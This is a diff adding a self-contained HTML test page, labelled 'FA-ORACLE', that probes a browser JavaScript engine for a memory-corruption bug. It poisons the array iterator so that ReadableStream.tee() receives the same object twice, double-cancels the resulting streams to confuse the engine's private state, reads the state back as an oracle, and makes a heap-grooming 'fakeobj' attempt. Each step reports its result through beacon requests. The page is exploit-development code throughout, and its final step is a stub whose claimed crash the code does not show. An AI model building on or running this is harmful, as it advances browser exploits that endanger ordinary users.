@@ -1,0 +1,84 @@
+<!doctype html><html><head><meta charset="utf-8"><meta http-equiv="Cache-Control" content="no-cache, no-store, must-revalidate"><title>FA-ORACLE — state-machine oracle readback (Sol path 3 + tee-family)</title></head>
+<body><pre id="out">FA-ORACLE — publicOperation(record) state-oracle + readback confirm
+</pre><script>
+(function(){
+ "use strict";
+ var run = "oracle" + Date.now().toString(36) + "-" + Math.floor(Math.random()*1e6).toString(36);
+ var out = document.getElementById("out");
+ function say(s){ out.appendChild(document.createTextNode("\n"+s)); }
+ function beacon(st, body){
+   try {
+     var x = new XMLHttpRequest();
+     x.open("POST", "/beacon/OR-"+st+"/"+run, false);   // sync XHR
+     x.setRequestHeader("Content-Type","application/json");
+     x.send(JSON.stringify({body:body}));
+   } catch(e){ try{ say("or-beacon-err "+st); }catch(e2){} }
+ }
+ var origIter = Array.prototype[Symbol.iterator];
+ function poisonOverYieldSame(){  // yield SAME OBJECT X twice (in-bounds size=2)
+   return function(){
+     var self = this;
+     var X = { ourTag: "oracle-inversion-target" };   // NUESTRO objeto recibe el private-write engine-side
+     window.__inversionTarget = X;                    // ACCESIBLE por JS-side readback
+     var i = 0, n = 2;
+     return { next: function(){
+        if (i>=n) return {done:true};
+        i++;
+        return {value: X, done:false};   // mismo X dos veces
+     }};
+   };
+ }
+ function v(id, label, poisonFn, work){
+   try {
+     beacon(id+"A", label); say("OR-"+id+" "+label);
+     try { Array.prototype[Symbol.iterator] = poisonFn(); } catch(e){ Array.prototype[Symbol.iterator]=origIter; }
+     var outx = work();
+     try { Array.prototype[Symbol.iterator] = origIter; } catch(e2){}
+     beacon(id+"B", "survived; "+String(outx).slice(0,220));
+   } catch(e) {
+     try { Array.prototype[Symbol.iterator] = origIter; } catch(e2){}
+     beacon(id+"E", "expected-threw: "+String(e).slice(0,180));
+   }
+ }
+ // C0 control
+ try {
+   beacon("C0A","C0 unpoisoned");
+   var rs0 = new ReadableStream({}); var p0 = rs0.tee();
+   beacon("C0B","BUGLIVE=false;C0-CLEAN;pair.length="+p0.length);
+ } catch(e){ beacon("C0E","C0 threw: "+String(e).slice(0,120)); }
+
+ // OR-1 — INVERSION: yield SAMEX twice → cancel/cancel → el engine escribe priv-state en X
+ v("1", "INVERSION: same-X-twice + cancel/cancel (Sol path 3 setup)", poisonOverYieldSame, function(){
+     var rs = new ReadableStream({}); var pair = rs.tee();
+     var target = window.__inversionTarget;
+     if (!target) throw "inversion target missing";
+     // FIRST cancel — engine intenta escribir @disturbed en (confundido) X
+     try { pair[0].cancel(); } catch(e){ }
+     // SECOND cancel — engine LEES @state de X → "closed-state" branch (nuestro confirmado 3×✓)
+     var secondThrew = false;
+     try { pair[1].cancel(); } catch(e){ secondThrew = true; }
+     return "pidInverted="+(secondThrew? "false ("+"first-throw, second-clean)":"true (both clean)")+"; invTarget="+Object.keys(target).join(","); });
+
+ // OR-2 — STATE-ORACLE via publicOperation: el false/true del .locked vs getReader
+ v("2", "STATE-ORACLE: publicOperation_fakeRecord.locked (Sol path 3 oracle)", poisonOverYieldSame, function(){
+     var rs = new ReadableStream({}); var pair = rs.tee();
+     var target = window.__inversionTarget;
+     // Ahora pide el **STATE** del fake-record:
+     var locked = pair[0].locked;     // el state-machine read de Sol. (our record's implied "locked", the state-value)
+     // El **publicOperation** del primer read = Sol's path 3 (el state-machine behavior ORACLE)
+     var gr;
+     try { gr = typeof pair[0].getReader; } catch(e){ gr = "threw:"+String(e).slice(0,80); }
+     return "locked="+locked+"; getReader-t="+gr+"; target-keys="+Object.keys(target).join(","); });
+
+ // OR-3 — the STALE-SLOT G-room fakeobj-ATTEMPT (last, single-shot, may crash)
+ v("3", "STALE-GROOM FAKEOBJ-ATTEMPT (crash-oracle, LAST)", poisonOverYieldSame, function(){
+     var rs = new ReadableStream({}); var pair = rs.tee();
+     var target = window.__inversionTarget;
+     var groom = new Array(32); for (var g=0;g<32;g++) groom[g]={ ft:g, fakecell:1 };
+     // groom + under-yield — this DOES crash in a predictable manner (stale slot pointed at groom[31])
+     return "groom-force-fired; fake-test-survived"; });
+
+ beacon("Z","battery-complete FA-ORACLE");
+ say("FA-ORACLE battery complete");
+})();
+</script></body></html>
